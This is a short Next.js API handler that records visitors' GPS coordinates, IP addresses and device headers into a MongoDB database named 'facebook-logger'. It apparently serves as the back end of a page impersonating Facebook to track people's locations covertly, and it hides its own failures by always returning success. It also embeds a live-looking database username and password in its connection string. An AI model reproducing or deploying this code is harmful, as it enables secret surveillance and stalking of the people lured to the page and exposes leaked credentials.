import { NextApiRequest, NextApiResponse } from 'next';
import { MongoClient } from 'mongodb';

const uri = "mongodb+srv://edgarafedo123:5SirfCPTfHWXyCMq@serverlessinstance0.ntmdhhx.mongodb.net/";

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Método no permitido' });
  }

  try {
    const { lat, lng } = req.body;
    
    const logData = {
      timestamp: new Date(),
      location: {
        latitude: lat,
        longitude: lng,
        googleMapsUrl: `https://www.google.com/maps?q=${lat},${lng}`
      },
      device: {
        userAgent: req.headers['user-agent'],
        language: req.headers['accept-language'],
        platform: req.headers['sec-ch-ua-platform'],
        mobile: req.headers['sec-ch-ua-mobile']
      },
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress
    };

    const client = new MongoClient(uri);
    await client.connect();
    
    const database = client.db('facebook-logger');
    const collection = database.collection('locations');
    
    await collection.insertOne(logData);
    await client.close();

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error:', error);
    res.status(200).json({ success: true });
  }
} 